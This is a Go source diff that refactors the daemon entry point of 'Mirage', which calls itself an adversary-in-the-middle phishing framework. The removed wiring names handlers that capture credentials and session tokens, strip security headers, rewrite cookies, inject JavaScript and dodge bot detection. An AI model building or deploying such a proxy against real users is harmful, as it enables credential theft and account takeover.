@@ -6,21 +6,11 @@ import (
 	"log/slog"
 	"os"
 	"os/signal"
-	"path/filepath"
 	"syscall"
 
 	"github.com/spf13/cobra"
 
-	"github.com/travisbale/mirage/internal/aitm"
-	"github.com/travisbale/mirage/internal/api"
-	"github.com/travisbale/mirage/internal/botguard"
-	"github.com/travisbale/mirage/internal/cert"
 	"github.com/travisbale/mirage/internal/config"
-	"github.com/travisbale/mirage/internal/events"
-	"github.com/travisbale/mirage/internal/proxy"
-	"github.com/travisbale/mirage/internal/proxy/handlers/request"
-	"github.com/travisbale/mirage/internal/proxy/handlers/response"
-	"github.com/travisbale/mirage/internal/store/sqlite"
 )
 
 var Version = "dev"
@@ -33,11 +23,9 @@ func main() {
 	)
 
 	root := &cobra.Command{
-		Use:   "miraged",
-		Short: "Mirage AiTM phishing framework daemon",
-		RunE: func(cmd *cobra.Command, args []string) error {
-			return runServe(cmd.Context(), configPath, debug, developer)
-		},
+		Use:          "miraged",
+		Short:        "Mirage AiTM phishing framework daemon",
+		RunE:         func(cmd *cobra.Command, args []string) error { return cmd.Help() },
 		SilenceUsage: true,
 	}
 
@@ -47,11 +35,12 @@ func main() {
 
 	serveCmd := &cobra.Command{
 		Use:   "serve",
-		Short: "Start the miraged daemon",
+		Short: "Start the miraged daemon (default)",
 		RunE: func(cmd *cobra.Command, args []string) error {
 			return runServe(cmd.Context(), configPath, debug, developer)
 		},
 	}
+	root.RunE = serveCmd.RunE // serve is the default when no subcommand is given
 
 	validateCmd := &cobra.Command{
 		Use:   "validate",
@@ -74,9 +63,7 @@ func main() {
 	versionCmd := &cobra.Command{
 		Use:   "version",
 		Short: "Print the version and exit",
-		Run: func(cmd *cobra.Command, args []string) {
-			fmt.Println(Version)
-		},
+		Run:   func(cmd *cobra.Command, args []string) { fmt.Println(Version) },
 	}
 
 	root.AddCommand(serveCmd, validateCmd, versionCmd)
@@ -91,85 +78,17 @@ func main() {
 
 func runServe(ctx context.Context, configPath string, debug, developer bool) error {
 	logger := newLogger(debug)
-
-	cfg, err := loadConfig(configPath)
-	if err != nil {
+	daemon := &Daemon{
+		configPath: configPath,
+		developer:  developer,
+		log:        logger,
+	}
+	if err := daemon.Init(ctx); err != nil {
 		return err
 	}
-
-	bus := events.NewBus(events.DefaultBufferSize)
-
-	db, err := sqlite.Open(cfg.DBPath)
-	if err != nil {
-		return fmt.Errorf("opening database: %w", err)
-	}
-	defer db.Close()
-
-	caDir := filepath.Join(filepath.Dir(cfg.DBPath), "ca")
-	certSource, err := cert.NewSource(developer, caDir, logger)
-	if err != nil {
-		return err
-	}
-
-	botGuardSvc, sigDB, err := newBotGuardService(bus, sqlite.NewBotStore(db), logger)
-	if err != nil {
-		return err
-	}
-
-	sessionStore := sqlite.NewSessionStore(db)
-	sessionSvc := &aitm.SessionService{Store: sessionStore, Bus: bus}
-	lureSvc := &aitm.LureService{Store: sqlite.NewLureStore(db)}
-	phishletStore := sqlite.NewPhishletStore(db)
-	blacklistSvc := aitm.NewBlacklistService(bus)
-	phishletResolver := aitm.NewPhishletResolver(phishletStore, sqlite.NewLureStore(db))
-	activeHostnames := &proxy.ActiveHostnameSet{}
-	spoofProxy := proxy.NewSpoofProxy("")
-	wsHub := proxy.NewWSHub(bus, logger)
-
-	apiHandler := api.NewRouter(api.RouterDeps{
-		Sessions:  sessionSvc,
-		Lures:     lureSvc,
-		Phishlets: phishletStore,
-		Blacklist: blacklistSvc,
-		Botguard:  sigDB,
-		Bus:       bus,
-		Domain:    cfg.Domain,
-		Version:   Version,
-		Logger:    logger,
-	})
-
-	pipeline := buildPipeline(pipelineDeps{
-		botGuardSvc:      botGuardSvc,
-		blacklistSvc:     blacklistSvc,
-		sessionSvc:       sessionSvc,
-		sessionStore:     sessionStore,
-		phishletResolver: phishletResolver,
-		activeHostnames:  activeHostnames,
-		spoofProxy:       spoofProxy,
-		bus:              bus,
-		apiHandler:       apiHandler,
-		apiHostname:      cfg.API.SecretHostname,
-	}, logger)
-
-	p := &proxy.AITMProxy{
-		CertSource: certSource,
-		Pipeline:   pipeline,
-		WSHub:      wsHub,
-		Spoof:      spoofProxy,
-		Logger:     logger,
-	}
-	if cfg.API.SecretHostname != "" {
-		clientCA, err := loadOrGenerateCA(cfg.API.ClientCACertPath, logger)
-		if err != nil {
-			return err
-		}
-		p.SecretHostname = cfg.API.SecretHostname
-		p.ClientCAs = clientCA.CertPool()
-		logger.Info("API enabled", "hostname", cfg.API.SecretHostname, "ca_cert", cfg.API.ClientCACertPath)
-	}
-
-	addr := fmt.Sprintf(":%d", cfg.HTTPSPort)
-	return p.Start(ctx, addr)
+	daemon.Run(ctx)
+	daemon.Shutdown()
+	return nil
 }
 
 func newLogger(debug bool) *slog.Logger {
@@ -180,82 +99,4 @@ func newLogger(debug bool) *slog.Logger {
 	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: level}))
 	slog.SetDefault(logger)
 	return logger
-}
-
-func loadConfig(path string) (*config.Config, error) {
-	cfg, err := config.Load(path)
-	if err != nil {
-		return nil, fmt.Errorf("loading config: %w", err)
-	}
-	if err := cfg.Validate(); err != nil {
-		return nil, fmt.Errorf("invalid config: %w", err)
-	}
-	return cfg, nil
-}
-
-func newBotGuardService(bus aitm.EventBus, botStore aitm.BotStore, logger *slog.Logger) (*aitm.BotGuardService, *botguard.JA4SignatureDB, error) {
-	bgCfg := botguard.BotGuardConfig{
-		Enabled:            false, // disabled until sig DB is populated
-		TelemetryThreshold: 0.6,
-	}
-	sigDB, err := botguard.NewJA4SignatureDB("", bus, logger)
-	if err != nil {
-		return nil, nil, fmt.Errorf("initialising JA4 signature DB: %w", err)
-	}
-	scorer := &botguard.Scorer{Cfg: bgCfg, SigDB: sigDB, Logger: logger}
-	return &aitm.BotGuardService{Scorer: scorer, Store: botStore, Bus: bus}, sigDB, nil
-}
-
-func loadOrGenerateCA(certPath string, logger *slog.Logger) (*api.CA, error) {
-	if _, err := os.Stat(certPath); os.IsNotExist(err) {
-		if err := os.MkdirAll(filepath.Dir(certPath), 0750); err != nil {
-			return nil, fmt.Errorf("creating CA directory: %w", err)
-		}
-		ca, err := api.GenerateCA(certPath)
-		if err != nil {
-			return nil, fmt.Errorf("generating API CA: %w", err)
-		}
-		logger.Info("generated API client CA", "cert", certPath)
-		return ca, nil
-	}
-	return api.Load(certPath)
-}
-
-type pipelineDeps struct {
-	botGuardSvc      *aitm.BotGuardService
-	blacklistSvc     *aitm.BlacklistService
-	sessionSvc       *aitm.SessionService
-	sessionStore     aitm.SessionStore
-	phishletResolver *aitm.PhishletResolver
-	activeHostnames  *proxy.ActiveHostnameSet
-	spoofProxy       *proxy.SpoofProxy
-	bus              aitm.EventBus
-	apiHandler       *api.Router
-	apiHostname      string
-}
-
-func buildPipeline(d pipelineDeps, logger *slog.Logger) *proxy.Pipeline {
-	req := []proxy.RequestHandler{
-		&request.JA4Extractor{},
-		&request.BotGuardCheck{Service: d.botGuardSvc, Spoof: d.spoofProxy},
-		&request.IPExtractor{},
-		&request.BlacklistChecker{Service: d.blacklistSvc, Spoof: d.spoofProxy},
-		&request.APIRouter{SecretHostname: d.apiHostname, Handler: d.apiHandler},
-		&request.PhishletRouter{ActiveHostnameSet: d.activeHostnames, Resolver: d.phishletResolver, Spoof: d.spoofProxy},
-		&request.LureValidator{Spoof: d.spoofProxy},
-		&request.SessionResolver{Store: d.sessionStore, Factory: d.sessionSvc},
-		&request.TelemetryScoreCheck{Scorer: d.botGuardSvc, Spoof: d.spoofProxy, Threshold: 0.6},
-		&request.URLRewriter{},
-		&request.CredentialExtractor{Store: d.sessionStore, Bus: d.bus},
-		&request.ForcePostInjector{},
-	}
-	resp := []proxy.ResponseHandler{
-		&response.SecurityHeaderStripper{},
-		&response.CookieRewriter{},
-		&response.SubFilterApplier{},
-		&response.TokenExtractor{Store: d.sessionStore, Bus: d.bus, Completer: d.sessionSvc, Whitelist: d.blacklistSvc},
-		&response.JSInjector{},
-		&response.JSObfuscator{Obfuscator: &response.NoOpObfuscator{}},
-	}
-	return &proxy.Pipeline{RequestHandlers: req, ResponseHandlers: resp, Logger: logger}
 }
